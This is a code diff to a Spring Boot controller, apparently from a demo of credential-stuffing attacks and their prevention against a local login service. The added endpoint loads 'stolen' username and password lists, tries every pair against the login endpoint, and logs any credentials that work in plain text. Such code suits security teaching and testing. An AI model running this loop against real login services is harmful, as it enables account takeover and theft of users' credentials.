@@ -12,9 +12,7 @@ import org.springframework.web.bind.annotation.RestController;
 import org.springframework.web.client.RestTemplate;
 
 import java.net.URISyntaxException;
-import java.util.HashMap;
-import java.util.Map;
-import java.util.Objects;
+import java.util.*;
 
 @Slf4j
 @RestController
@@ -23,7 +21,7 @@ public class CredentialStuffingController {
     String hostUrl = "http://localhost:8080/";
 
     @PostMapping("/v1/attack")
-    public ResponseEntity<String> bruteForceAttackV1(@RequestParam String userName, @RequestParam String newPassword) {
+    public ResponseEntity<String> bruteForceAttack(@RequestParam String userName, @RequestParam String newPassword) {
 
         HttpHeaders headers = new HttpHeaders();
         headers.setContentType(MediaType.APPLICATION_FORM_URLENCODED);
@@ -59,7 +57,7 @@ public class CredentialStuffingController {
     }
 
     @PostMapping("/v2/attack")
-    public ResponseEntity<String> bruteForceAttackV2(@RequestParam String userName, @RequestParam String newPassword) throws URISyntaxException {
+    public ResponseEntity<String> bruteForceAttackWithPrevention(@RequestParam String userName, @RequestParam String newPassword) throws URISyntaxException {
 
         HttpHeaders headers = new HttpHeaders();
         headers.setContentType(MediaType.APPLICATION_FORM_URLENCODED);
@@ -91,8 +89,48 @@ public class CredentialStuffingController {
             }
         }
         Map<String, String> errorDetails = new HashMap<>();
-        errorDetails.put("ErrorMessage", "ATTACK is not successful for user: " + userName);
+        errorDetails.put("ErrorMessage", "ATTACK is NOT successful for user: " + userName);
         return new ResponseEntity(errorDetails, HttpStatus.TOO_MANY_REQUESTS);
     }
 
+    @PostMapping("/v1/login-credential-stuffing")
+    public ResponseEntity<String> bruteForceAttackCredentialStuffing() {
+
+        Set<String> usernames = CredentialsStuffingService.loadStolenData("usernames");
+        Set<String> passwords = CredentialsStuffingService.loadStolenData("passwords");
+
+        for (String username : usernames) {
+            for (String password : passwords) {
+                User user = User.builder().userName(username).password(password).build();
+                HttpHeaders headers = new HttpHeaders();
+
+                headers.setContentType(MediaType.APPLICATION_JSON);
+                headers.setAccept(Collections.singletonList(MediaType.APPLICATION_JSON));
+
+
+                MultiValueMap<String, Object> requestBody = new LinkedMultiValueMap<>();
+                requestBody.add("user", user);
+
+                try {
+                    RestTemplate restTemplate = new RestTemplate();
+                    restTemplate.getInterceptors().add(new BasicAuthenticationInterceptor("user", "pass"));
+                    String endpoint = hostUrl + "v1/login";
+
+                    ResponseEntity<String> result = restTemplate.postForEntity(endpoint, requestBody, String.class);
+
+                    if (result.hasBody() && Objects.requireNonNull(result.getBody()).contains("success")) {
+                        log.info("Result: " + result + " LOGIN is successful user: " +
+                                username + " with password: " + password);
+                        return ResponseEntity.ok("LOGIN is successful for user: " +
+                                username + " with password: " + password);
+                    }
+                } catch (Exception e) {
+                    log.info("Login failed, incorrect credentials!");
+                }
+            }
+        }
+        Map<String, String> errorDetails = new HashMap<>();
+        errorDetails.put("ErrorMessage", "LOGIN is NOT successful with credential stuffing!");
+        return new ResponseEntity(errorDetails, HttpStatus.BAD_REQUEST);
+    }
 }
